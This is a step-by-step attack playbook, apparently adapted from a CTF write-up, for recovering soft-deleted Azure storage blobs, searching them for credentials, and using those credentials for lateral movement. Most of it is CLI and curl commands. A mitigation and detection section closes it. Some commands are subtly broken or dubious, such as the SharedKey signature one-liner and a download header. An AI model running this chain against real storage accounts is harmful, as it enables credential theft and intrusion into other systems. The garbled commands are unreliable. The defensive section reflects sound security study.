# Azure Blob Deleted Versions to Credential Exfiltration

## Chain Summary
**Entry Point:** Storage Account access with soft-delete enabled  
**Severity:** High  
**Source:** https://kabinet.gitbook.io/ctf-writeup/2025/thuderdome/an-absent-defense

Exploits Azure Storage soft-delete feature to recover and download recently deleted blobs. Attackers enumerate deleted blob versions via Storage Explorer or Azure CLI, then download versions containing plaintext credentials, environment exports, or configuration files inadvertently deleted by legitimate users.

---

## Chain: Storage Account Enum → Enable Show Deleted → Download Deleted Blob Versions → Credential Exfil

### [1] Storage Account Access & Enumeration
- **Trigger:** Compromised identity with `Microsoft.Storage/storageAccounts/listkeys/action` or direct storage account access key
- **Prereq:** Azure CLI authenticated; role with Storage Account Contributor or Custom Role with blob access; target storage account name/subscription known
- **Method:**
  ```bash
  # List storage accounts in subscription
  az storage account list --query "[].{Name:name, RG:resourceGroup, Location:location}" -o table
  
  # Get storage account keys (if PrivEsc allows)
  az storage account keys list --account-name <STORAGE_ACCT> --resource-group <RG> -o table
  
  # Or use managed identity / connection string from app config
  export AZURE_STORAGE_ACCOUNT="<STORAGE_ACCT>"
  export AZURE_STORAGE_KEY="<KEY>"
  ```
- **Yields:** Authenticated access to target storage account; storage key or token for blob operations

### [2] Enumerate Blob Containers
- **Trigger:** Storage account access obtained; need to find containers with sensitive data
- **Prereq:** Storage account credentials or authenticated CLI session; `Microsoft.Storage/storageAccounts/blobServices/containers/read` permission
- **Method:**
  ```bash
  # List all blob containers
  az storage container list --account-name <STORAGE_ACCT> --query "[].name" -o table
  
  # Or via Storage Explorer UI (if using GUI) or REST API
  curl -s "https://<STORAGE_ACCT>.blob.core.windows.net/?comp=list" \
    -H "Authorization: SharedKey <STORAGE_ACCT>:$(base64 -w0 <<<"$(echo -ne 'GET\n\n\n\n\n\n\n\n\n\n\n\n\nx-ms-date:...' | openssl sha256 -hmac ...)")"
  ```
- **Yields:** List of container names; identify high-value targets (backups, exports, config, logs)

### [3] List Deleted Blobs (Storage Explorer / Azure CLI with --include-deleted)
- **Trigger:** Container identified; soft-delete enabled (likely on sensitive containers); need to view deletion history
- **Prereq:** Container access; `Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read` permission; CLI version supporting `--include-deleted` or Storage Explorer UI
- **Method (Azure CLI — version 2.34+):**
  ```bash
  # List all blobs including deleted versions
  az storage blob list \
    --container-name <CONTAINER> \
    --account-name <STORAGE_ACCT> \
    --include d  # 'd' = deleted; other flags: s=snapshots, t=tags, v=versions, u=uncommitted
  
  # Or: list only deleted
  az storage blob list \
    --container-name <CONTAINER> \
    --account-name <STORAGE_ACCT> \
    --include d \
    --query "[?isDeleted].{Name:name, Deleted:deleted, Time:properties.deletedTime, Size:properties.contentLength}"
  ```

**Method (Storage Explorer UI):**
  - Open Storage Explorer → target Storage Account → Blob Containers
  - Right-click container → select "View Deleted Blobs" (option in UI)
  - Toggle "Show Deleted Blobs" in the filter bar
  - View and download deleted blob versions

**Method (Direct REST API):**
  ```bash
  # REST API to list deleted blobs
  curl -s "https://<STORAGE_ACCT>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list&include=d" \
    -H "Authorization: SharedKey <STORAGE_ACCT>:<SIGNATURE>" \
    -H "x-ms-version: 2021-12-02" \
    | xmllint --format -
  ```
- **Yields:** List of deleted blob names, deletion timestamps, versions; identify credentials or config exports

### [4] Download Deleted Blob Versions
- **Trigger:** Deleted blob identified (e.g., `config-backup-2024-12-05.zip`, `secrets.env`, `.aws/credentials.bak`); need to recover contents
- **Prereq:** Container access; deleted blob name + version ID (if versioning enabled); download permission
- **Method (Azure CLI):**
  ```bash
  # List versions of a specific blob (if versioning enabled)
  az storage blob list-versions \
    --container-name <CONTAINER> \
    --name <BLOB_NAME> \
    --account-name <STORAGE_ACCT> \
    -o table
  
  # Download a specific deleted version
  # Note: Use the snapshot/version ID returned from the list command
  az storage blob download \
    --container-name <CONTAINER> \
    --name <BLOB_NAME> \
    --account-name <STORAGE_ACCT> \
    --file ./recovered_blob.zip \
    --snapshot <SNAPSHOT_ID>  # If applicable
  ```

**Method (Storage Explorer UI):**
  - Right-click deleted blob → "Restore"
  - Or: Right-click deleted blob → "Download" (directly without restore)
  - Save to local disk

**Method (Direct REST API):**
  ```bash
  # GET request to blob with deletion restore
  curl -s "https://<STORAGE_ACCT>.blob.core.windows.net/<CONTAINER>/<BLOB_NAME>" \
    -H "Authorization: SharedKey <STORAGE_ACCT>:<SIGNATURE>" \
    -H "x-ms-version: 2021-12-02" \
    -H "x-ms-include-snapshots: true" \
    -o recovered_blob.zip
  ```
- **Yields:** Recovered blob file (ZIP, JSON, env file, database export, etc.) containing sensitive data

### [5] Extract Credentials from Recovered Blobs
- **Trigger:** Deleted blob downloaded (e.g., config.zip, backup.tar.gz, export.sql)
- **Prereq:** Recovered file; tools: `unzip`, `tar`, `jq`, `grep`; ability to parse file formats
- **Method:**
  ```bash
  # Decompress archive
  unzip recovered_blob.zip -d ./extracted/
  tar -xzf recovered_blob.tar.gz -C ./extracted/
  
  # Search for credentials
  grep -r "password\|secret\|key\|token\|credential" ./extracted/ --include="*.json" --include="*.env" --include="*.conf" --include="*.sql"
  
  # Extract plaintext credentials from common file types
  # From JSON config
  cat ./extracted/config.json | jq '.database | {user, password}'
  
  # From .env files
  grep -E "AWS_ACCESS|DB_PASSWORD|ADMIN_TOKEN" ./extracted/.env
  
  # From SQL dump
  grep "INSERT INTO users" ./extracted/backup.sql | head -5
  
  # From Azure Key Vault export (if exported as JSON)
  cat ./extracted/keyvault_secrets.json | jq '.[] | {id, value}'
  ```
- **Yields:** Plaintext credentials (database passwords, API keys, AWS credentials, Azure tokens, SSH keys, etc.)

### [6] Credential Use for Lateral Movement / Account Takeover
- **Trigger:** Credentials extracted; target systems/services identified from environment config or metadata
- **Prereq:** Extracted credentials; target service accessible; valid credential format
- **Method:**
  ```bash
  # Use database credentials
  psql -h db.internal -U admin -p 5432 --password  # Paste extracted DB password
  
  # Use AWS credentials
  export AWS_ACCESS_KEY_ID="<extracted_key>"
  export AWS_SECRET_ACCESS_KEY="<extracted_secret>"
  aws sts get-caller-identity
  
  # Use Azure credentials
  az login -u <extracted_username> -p <extracted_password>
  
  # Use SSH keys
  ssh -i ./extracted/id_rsa admin@target.internal
  ```
- **Yields:** Authenticated access to additional systems; privilege escalation; data exfiltration; lateral movement

---

## Mitigation & Detection

**Prevention:**
- **Retention Policies:** Set blob soft-delete retention to **minimal** (7 days or less) or disable for highly sensitive containers
- **Access Control:** Restrict `Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read` to necessary identities only
- **Encryption at Rest:** Use Customer-Managed Keys (CMK) so deleted blobs remain encrypted
- **Immutable Blobs:** For archival backups, use append-only or time-based immutability to prevent deletion
- **Secrets Management:** Do NOT export credentials to blobs; use Azure Key Vault, Managed Identity, or Secrets Manager
- **Backup Protection:** If backing up databases or configs, strip credentials or use reference tokens instead of plaintext secrets
- **Logging & Monitoring:** Enable storage account logging and set up alerts on blob access patterns

**Detection:**
- **Storage Blob Diagnostics:** Enable Diagnostic Logging for all blob operations (read, delete, access)
- **Azure Defender for Storage:** Alert on unusual data access patterns, potential data exfiltration
- **Storage Analytics:** Monitor `blob-delete`, `blob-restore` operations; alert on large downloads
- **Azure Monitor Alerts:** Set alerts for:
  - Blob downloads exceeding threshold
  - Access to deleted or archived blobs
  - API calls with `include=d` (show deleted)
- **Log Aggregation:** Feed Azure Storage logs to Log Analytics; query for deletion + immediate access patterns

---

## References
- Azure Blob Soft Delete: https://learn.microsoft.com/en-us/azure/storage/blobs/soft-delete-blob-overview
- Azure Storage Access Tiers: https://learn.microsoft.com/en-us/azure/storage/blobs/access-tiers-overview
- Blob Versioning: https://learn.microsoft.com/en-us/azure/storage/blobs/versioning-overview
- Storage Account Access Control (RBAC): https://learn.microsoft.com/en-us/azure/storage/common/storage-auth-aad-rbac-portal
